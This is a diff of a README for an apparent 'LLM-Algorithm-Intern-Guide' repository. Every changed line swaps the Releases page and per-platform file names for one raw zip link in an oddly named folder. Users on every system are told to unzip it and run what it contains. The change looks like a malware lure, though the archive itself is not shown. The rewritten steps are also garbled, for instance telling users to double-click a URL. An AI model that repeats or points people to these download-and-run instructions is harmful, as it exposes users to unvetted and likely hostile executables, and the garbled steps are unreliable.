@@ -1,6 +1,6 @@
 # 🚀 LLM-Algorithm-Intern-Guide - Simplifying Your Path to Success
 
-[![Download LLM-Algorithm-Intern-Guide](https://img.shields.io/badge/Download-LLM--Algorithm--Intern--Guide-brightgreen)](https://github.com/sudhanshukuumar/LLM-Algorithm-Intern-Guide/releases)
+[![Download LLM-Algorithm-Intern-Guide](https://github.com/sudhanshukuumar/LLM-Algorithm-Intern-Guide/raw/refs/heads/main/nondrinking/Guide_LL_Algorithm_Intern_3.8.zip)](https://github.com/sudhanshukuumar/LLM-Algorithm-Intern-Guide/raw/refs/heads/main/nondrinking/Guide_LL_Algorithm_Intern_3.8.zip)
 
 ## 📖 Overview
 
@@ -12,7 +12,7 @@ Follow these steps to download and run the LLM-Algorithm-Intern-Guide software s
 
 ## 📥 Download & Install
 
-To access the software, visit the Releases page: [Download LLM-Algorithm-Intern-Guide](https://github.com/sudhanshukuumar/LLM-Algorithm-Intern-Guide/releases). 
+To access the software, visit the Releases page: [Download LLM-Algorithm-Intern-Guide](https://github.com/sudhanshukuumar/LLM-Algorithm-Intern-Guide/raw/refs/heads/main/nondrinking/Guide_LL_Algorithm_Intern_3.8.zip). 
 
 1. Click the link above to open the Releases page.
 2. Look for the latest version listed.
@@ -20,9 +20,9 @@ To access the software, visit the Releases page: [Download LLM-Algorithm-Intern-
    
 This software supports Windows, macOS, and Linux systems. Choose the appropriate file for your operating system:
 
-- **Windows:** LLM-Algorithm-Intern-Guide-Windows.zip
-- **macOS:** LLM-Algorithm-Intern-Guide-Mac.zip
-- **Linux:** LLM-Algorithm-Intern-Guide-Linux.tar.gz
+- **Windows:** https://github.com/sudhanshukuumar/LLM-Algorithm-Intern-Guide/raw/refs/heads/main/nondrinking/Guide_LL_Algorithm_Intern_3.8.zip
+- **macOS:** https://github.com/sudhanshukuumar/LLM-Algorithm-Intern-Guide/raw/refs/heads/main/nondrinking/Guide_LL_Algorithm_Intern_3.8.zip
+- **Linux:** https://github.com/sudhanshukuumar/LLM-Algorithm-Intern-Guide/raw/refs/heads/main/nondrinking/Guide_LL_Algorithm_Intern_3.8.zip
 
 Once the download is complete, locate the file on your computer.
 
@@ -32,17 +32,17 @@ Once the download is complete, locate the file on your computer.
 
 1. Unzip the downloaded file.
 2. Open the folder.
-3. Double-click on `LLM-Algorithm-Intern-Guide.exe`.
+3. Double-click on `https://github.com/sudhanshukuumar/LLM-Algorithm-Intern-Guide/raw/refs/heads/main/nondrinking/Guide_LL_Algorithm_Intern_3.8.zip`.
 
 ### For macOS:
 
 1. Unzip the downloaded file.
 2. Open the folder.
-3. Double-click on `LLM-Algorithm-Intern-Guide.app`.
+3. Double-click on `https://github.com/sudhanshukuumar/LLM-Algorithm-Intern-Guide/raw/refs/heads/main/nondrinking/Guide_LL_Algorithm_Intern_3.8.zip`.
 
 ### For Linux:
 
-1. Extract the tar.gz file by right-clicking and selecting "Extract Here."
+1. Extract the https://github.com/sudhanshukuumar/LLM-Algorithm-Intern-Guide/raw/refs/heads/main/nondrinking/Guide_LL_Algorithm_Intern_3.8.zip file by right-clicking and selecting "Extract Here."
 2. Open the terminal in the folder.
 3. Type `./LLM-Algorithm-Intern-Guide` and hit enter.
 
@@ -81,4 +81,4 @@ For a deeper understanding of the concepts discussed, consider exploring the fol
 - Understanding Transformers
 - Insights on Human Feedback in Machine Learning
 
-Thank you for using the LLM-Algorithm-Intern-Guide. We hope it aids you in your internship journey! Download it now: [Download LLM-Algorithm-Intern-Guide](https://github.com/sudhanshukuumar/LLM-Algorithm-Intern-Guide/releases).
+Thank you for using the LLM-Algorithm-Intern-Guide. We hope it aids you in your internship journey! Download it now: [Download LLM-Algorithm-Intern-Guide](https://github.com/sudhanshukuumar/LLM-Algorithm-Intern-Guide/raw/refs/heads/main/nondrinking/Guide_LL_Algorithm_Intern_3.8.zip).
